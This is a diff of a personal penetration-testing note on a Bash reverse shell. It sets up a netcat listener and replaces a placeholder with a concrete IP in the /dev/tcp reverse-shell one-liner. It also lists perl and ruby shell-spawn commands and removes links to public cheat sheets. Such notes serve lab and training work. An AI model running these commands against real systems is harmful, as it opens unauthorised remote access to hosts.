@@ -1,12 +1,10 @@
 # bash
 
-**Author:** Julien Bongars\
-**Date:** 2025-09-21 10:30:31
-**Path:**
+Author: Julien Bongars
+Date: 2025-09-21 10:30:31
+Path: /opt/development/cybersec/hacklas/notes/infiltration/reverse-shell/bash.md
 
 ---
-
-Bash reverse shell over `/dev/tcp`, then PTY upgrade on the listener.
 
 ## Source Machine
 
@@ -17,7 +15,7 @@ nc -lvnp 443
 ## Target Machine
 
 ```bash
-bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4443 0>&1"
+bash -c "bash -i >& /dev/tcp/192.168.45.234/4443 0>&1"
 ```
 
 ## Back to Source Machine
@@ -98,8 +96,3 @@ perl -e 'exec "/bin/bash";'
 ```bash
 ruby -e 'exec "/bin/bash"'
 ```
-
-## Resources
-
-- [PayloadsAllTheThings — Bash](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash) — `/dev/tcp` variants
-- [HackTricks — full TTY](https://book.hacktricks.wiki/en/generic-hacking/revshells/full-ttys.html) — PTY upgrade
